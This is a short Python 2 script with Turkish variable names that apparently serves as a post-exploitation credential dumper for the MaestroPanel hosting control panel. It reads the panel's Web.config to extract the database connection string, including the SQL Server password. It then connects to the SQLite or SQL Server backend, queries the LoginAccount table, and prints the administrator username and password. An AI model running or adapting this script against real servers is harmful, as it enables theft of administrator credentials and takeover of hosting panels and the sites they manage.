import sqlite3, os, re, pyodbc

MPpath = os.getenv("MaestroPanelPath")
WebcfgPath = "%s\Web\www\Web.config" % MPpath

read_file = open(WebcfgPath, "r")

for i, line in enumerate(read_file, 1):
    lookup = 'MaestroConnection'
    if lookup in line:
        connstring = line
read_file.close()

def kesbic(x, y, z):
    m = re.search(('%s(.+?)%s'% (x, y)), connstring)
    if m:
        found = m.group(1)
    return found

dbTipi = kesbic('providerName="', '"/></connection', connstring)

if dbTipi == "System.Data.SQLite":  #sqlite    
    dbPath = kesbic('Data Source=', ';Version', connstring)
    con = sqlite3.connect(dbPath)
    cur = con.cursor()
    cur.execute('SELECT UserName FROM LoginAccount WHERE UserType=0')
    dataUser = cur.fetchone()
    cur.execute('SELECT Password FROM LoginAccount WHERE UserType=0')
    dataPass = cur.fetchone()
    con.close()
    print "MaestroPanel kullanici adi '%s' sifresi ise '%s'"% (dataUser[0], dataPass[0])

if dbTipi == "System.Data.SqlClient": #sql
    dbPath = {}
    dbPath["IPAdresi"] = kesbic('Data Source=', ';Initial', connstring)
    dbPath["DBIsmi"] = kesbic('Catalog=', ';User', connstring)
    dbPath["DBuser"] = kesbic('Id=', ';Passw', connstring)
    dbPath["Userpass"] = kesbic('Password=', ';" provid', connstring)
    connn = ('DRIVER={SQL Server};SERVER=%s;DATABASE=%s;UID=%s;PWD=%s')% (dbPath["IPAdresi"], dbPath["DBIsmi"], dbPath["DBuser"], dbPath["Userpass"])
    cnxn = pyodbc.connect(connn)
    cursor = cnxn.cursor()
    cursor.execute("SELECT UserName FROM LoginAccount")
    dataUser = cursor.fetchone()
    cursor.execute("SELECT Password FROM LoginAccount")
    dataPass = cursor.fetchone()
    print "MaestroPanel kullanici adi '%s' sifresi ise '%s'"% (dataUser[0], dataPass[0])



